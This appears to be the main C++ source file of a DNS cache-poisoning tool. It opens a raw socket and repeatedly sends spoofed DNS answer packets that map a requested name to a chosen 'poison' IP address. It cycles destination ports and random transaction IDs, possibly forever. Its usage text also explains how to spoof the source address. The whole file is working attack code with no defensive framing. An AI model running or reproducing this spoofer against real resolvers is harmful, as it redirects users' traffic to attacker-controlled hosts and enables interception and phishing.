#include <iostream>
#include <string>

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <getopt.h>
#include <time.h>

#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#if defined(__linux__) || defined(__FreeBSD__)
#include <arpa/nameser.h>
#else
#include <nameser.h>
#endif
//#include <resolv.h>

#include "utils.hpp"
#include "name_buffer.hpp"

#define SA struct sockaddr
#define SAIN struct sockaddr_in

uint16_t assign_port();
uint16_t assign_dns_id();
void usage(char* prog_name);
void interval(struct timeval i);
//int   get_resolver_count(void);
//char* get_resolver_name(int i);

extern bool debug;

int
main(int argc, char** argv)
{
    int opt;
    int option_index;

    const int on  = 1;
    const int off = 0;
    int err;

    // opt_*
    debug = false;
    int wait = 0;
    struct timespec wait_time;
    memset(&wait_time, 0, sizeof(struct timespec));
    int count = 0;
    uint16_t target_id = 0;
    uint16_t target_port = 0;
    std::string opt_d;
    std::string opt_a;
    std::string opt_r;
    std::string opt_s;

    struct option long_options[] = {
        {"help",    no_argument,       NULL, 'h'},
#ifdef DEBUG
        {"verbose", no_argument,       NULL, 'v'},
#endif
        {"dst",     required_argument, NULL, 'd'},
        {"src",     required_argument, NULL, 's'},
        {"ans",     required_argument, NULL, 'a'},
        {"req",     required_argument, NULL, 'r'},
        {"count",   required_argument, NULL, 'c'},
        {"t_port",  required_argument, NULL, 'x'},
        {"t_id",    required_argument, NULL, 'y'},
        {"wait",    required_argument, NULL, 'w'},
        {0, 0, 0, 0}
    };


    while ((opt = getopt_long(argc, argv, "a:r:d:s:c:x:y:?hv", long_options, &option_index)) != -1) {
        switch (opt) {
#ifdef DEBUG
            case 'v':
                debug = true;
                break;
#endif
            case 'h':
                usage(argv[0]);
                exit(EXIT_SUCCESS);
                break;
            case 'd':
                opt_d = optarg;
                break;
            case 's':
                opt_s = optarg;
                break;
            case 'a':
                opt_a = optarg;
                break;
            case 'r':
                opt_r = optarg;
                break;
            case 'x':
                try {
                    target_port = std::stoi(optarg);
                } catch (const std::exception& e) {
                    std::cout << "(-x) " << e.what() << std::endl;
                    exit(EXIT_FAILURE);
                }
                break;
            case 'y':
                try {
                    target_id = std::stoi(optarg);
                } catch (const std::exception& e) {
                    std::cout << "(-y) " << e.what() << std::endl;
                    exit(EXIT_FAILURE);
                }
                break;
            case 'c':
                try {
                    count = std::stoi(optarg);
                } catch (const std::exception& e) {
                    usage(argv[0]);
                    std::cout << "(-c) " << e.what() << std::endl;
                    exit(EXIT_FAILURE);
                }
                break;
            case 'w':
                try {
                    wait = std::stoi(optarg);
                    if (wait != 0) {
                        wait_time.tv_sec  = wait / 1000000000;
                        wait_time.tv_nsec = wait % 1000000000;
                    }
                } catch (const std::exception& e) {
                    usage(argv[0]);
                    std::cout << "(-w) " << e.what() << std::endl;
                    exit(EXIT_FAILURE);
                }
                break;
            case '?':
                usage(argv[0]);
                exit(EXIT_SUCCESS);
                break;
            default:
                exit(EXIT_FAILURE);
        }
    }

    if (opt_d.size() == 0) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    } else if (!is_ipv4_address(opt_d)) {
        usage(argv[0]);
        printf("(-d) the destination IP address was not parseable string.\n");
        exit(EXIT_FAILURE);
    }

    if (opt_s.size() == 0) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    } else if (!is_ipv4_address(opt_s)) {
        usage(argv[0]);
        printf("(-s) the source IP address was not parseable string.\n");
        exit(EXIT_FAILURE);
    }

    if (opt_a.size() == 0) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    } else if (!is_ipv4_address(opt_a)) {
        usage(argv[0]);
        printf("(-a) the poison IP address was not parseable string.\n");
        exit(EXIT_FAILURE);
    }

    if (opt_r.size() == 0) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (count < 0) {
        usage(argv[0]);
        printf("(-c) the count number is the unsigned number.\n");
        exit(EXIT_FAILURE);
    }

    srand(time(NULL));

    // raw socket open
    int fd;
    char buffer[BUFSIZ];
    memset(buffer, 0, sizeof(buffer));

    auto nb = new name_buffer;
    nb->set_buffer(buffer, sizeof(buffer));
    nb->set_iphdr(opt_s, opt_d);
    if (target_port != 0) {
        nb->set_udphdr(53, target_port);
    } else {
        nb->set_udphdr(53, assign_port());
    }
    if (target_id != 0) {
        nb->set_payload_dns_ans(target_id, QR|AA|RD|RA, opt_r, opt_a);
    } else {
        nb->set_payload_dns_ans(assign_dns_id(), QR|AA|RD|RA, opt_r, opt_a);
    }
    nb->post_processing();

    struct sockaddr_in sin = nb->get_dst_sockaddr();

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) {
        PERROR("socket");
        exit(EXIT_FAILURE);
    }

    err = setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    if (err < 0) {
        PERROR("setsockopt");
        close(fd);
        exit(EXIT_FAILURE);
    }

    int loop = true;
    int loop_count = 1;
    do {
        // You can also use a flag of MSG_DONTROUTE at sendto() in this program.
        ssize_t send_size = sendto(fd, nb->get_buffer(), nb->get_payload_size(),
                0, (struct sockaddr*)&sin, sizeof(sin));
        if (send_size < 0 ) {
            PERROR("snedto");
            close(fd);
            exit(EXIT_FAILURE);
        }

        // interval time;
        /*
        static struct timeval interval_time;
        memset(&interval_time, 0, sizeof(interval_time));
        interval(interval_time);
        */

        if (target_port != 0 && target_id != 0) {
            nb->change_dport_dnsid(target_port, target_id);
        } else if (target_port != 0) {
            nb->change_dport_dnsid(target_port, assign_dns_id());
        } else if (target_id != 0) {
            nb->change_dport_dnsid(assign_port(), target_id);
        } else {
            nb->change_dport_dnsid(assign_port(), assign_dns_id());
        }
        nb->post_processing();

        if (count <= loop_count) {
            loop = false;
        }

        if (debug) { 
            if (count > 10000 || count == 0) {
                if (loop_count % 10000 == 0) {
                    printf("loop_count:%d\n", loop_count);
                }
            } else {
                printf("loop_count:%d\n", loop_count);
            }
        }
        loop_count++;

        if (wait != 0) {
            nanosleep(&wait_time, NULL);
        }

    } while (loop || count==0);

    close(fd);
    return EXIT_SUCCESS;
}

void usage(char* prog_name)
{
    printf("%s\n", prog_name);
    printf("  Must..\n");
    printf("    -s [source address]\n");
    printf("    -d [destination address]\n");
    printf("    -a [ans address] \n");
    printf("    -r [req name]\n");
    printf("  Option..\n");
    printf("    -c [count number]     : 0 is loop                 (default:0)\n");
    printf("    -x [target port]      : 0 is sequential increment (default:0)\n");
    printf("    -y [target dns_is]    : 0 is random               (default:0)\n");
    printf("    -w [wait time of IPG] : unit is nano seconds      (defualt:0)\n");
    printf("    -v : verbose mode (default:disable)\n");
    printf("\n");
    printf("If you want to spoof the source address,\n");
    printf("you set a same option (-s) alias address to the sending IF.\n");
    printf("(Example bsd  : ifconfig lo0 alias x.x.x.x/xx)\n");
    printf("(Example linux: ifconfig lo0:1 x.x.x.x/xx)\n");
    return;
}

uint16_t assign_port()
{
    static int counter = 0;
    if (counter == 0xFFFF) {
        counter = 0;
    }
    counter++;
    return counter;
    //return rand();
}

uint16_t assign_dns_id()
{
    return rand();
}

void interval(struct timeval i)
{
    return;
}

/*
char* get_resolver_name(int i)
{
    struct sockaddr_in sin;
    memcpy(&sin, &(_res.nsaddr_list[i]), sizeof(struct sockaddr_in));
    return inet_ntoa(sin.sin_addr);
}

int get_resolver_count(void)
{
    return _res.nscount;
}
*/
